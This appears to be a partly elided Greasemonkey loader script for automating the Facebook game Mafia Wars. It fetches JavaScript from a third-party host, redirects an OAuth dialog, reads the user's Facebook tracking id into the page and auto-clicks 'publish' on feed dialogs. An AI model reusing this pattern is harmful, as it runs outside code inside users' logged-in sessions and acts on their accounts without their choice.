// ==UserScript==
// @name           DEMON 1096
// @namespace      http://www.tokobesi.com
// @description    maok TUYUL
...
// @icon           https://7b402a1a-a-62cb3a1a-s-sites.googlegroups.com/site/syerasite/image/alert_blink_icon.gif
// @version        Glitcher 〤
// ==/UserScript==

(function () { //need more attention for make this scripts run as well (if you use this loader gift credit for http://www.syerasite.com and Special Thanks for "DEMONKILLER" ) 
	var skip = false;
	...
	if (document.location.href.indexOf('dialog/oauth?client_id=10979261223') > -1) {
		top.location.href = location.protocol + '//unframes.blogspot.com/';
		return;
	}
	...
	(function (f) {
		function m(a, b, e) {
			n || GM_xmlhttpRequest({
				method: "GET",
				url: "http://yourjavascript.com/32831021564/test10982.js",
		...
		f.start = function () {
			...
			a: {
				...
				a = -1 !== l.indexOf("xw_controller=freegifts") || -1 !== l.indexOf("xw_controller=requests") || -1 !== l.indexOf("hidden=1") || -1 !== l.indexOf(
					"next_params=YTozOntpOjA7czo1OiJpbmRleCI7aToxO3M6NDoidmlldyI7aToyO3M6OToiJmhpZGRlbj0xIjt9") || -1 === l.indexOf("html_server.php") || !document.getElementById(
					"final_wrapper") || document.getElementById("demondata") ? k : d
			}
			a && (e = document.createElement("span"), e.setAttribute("id", "demondata"), e.setAttribute("style", "display:none;"), e.setAttribute("data-loader",
					"2.5.0"), document.body.appendChild(e), a = document.createElement("script"), a.innerHTML =
				'document.getElementById("demondata").setAttribute("data-fbid", User.trackId);', document.body.appendChild(a), c())
		}
	})(p || (p = {}));
	var s;
	(function (f) {
		...
		function c(b) {
			try {
				var g = document.evaluate('//input[@type="submit" and @name="publish"]', document, h, XPathResult.ANY_UNORDERED_NODE_TYPE, h)
					.singleNodeValue;
				g || (g = document.evaluate('//input[@type="button" and @name="publish"]', document, h, XPathResult.ANY_UNORDERED_NODE_TYPE, h)
					.singleNodeValue);
		...
		f.start = function () {
			-1 !== window.location.href.indexOf("dialog/feed") ? -1 !== document.body.innerHTML.indexOf("inthemafia") && GM_getValue("autopost") && c(k) : -1 !==
				window.location.href.indexOf("apps.facebook.com/inthemafia") && GM_getValue("autopost") && c(d)
		}
	})(s || (s = {}));
	var t;
	(function (f) {
		f.start = function () {
			...
			if (c = document.getElementById("chromakey"))
				if (f = c.getAttribute("data-key")) GM_setValue("chromaKey", f), c.innerHTML = 'Userscript Extension Found and Activated'
		}
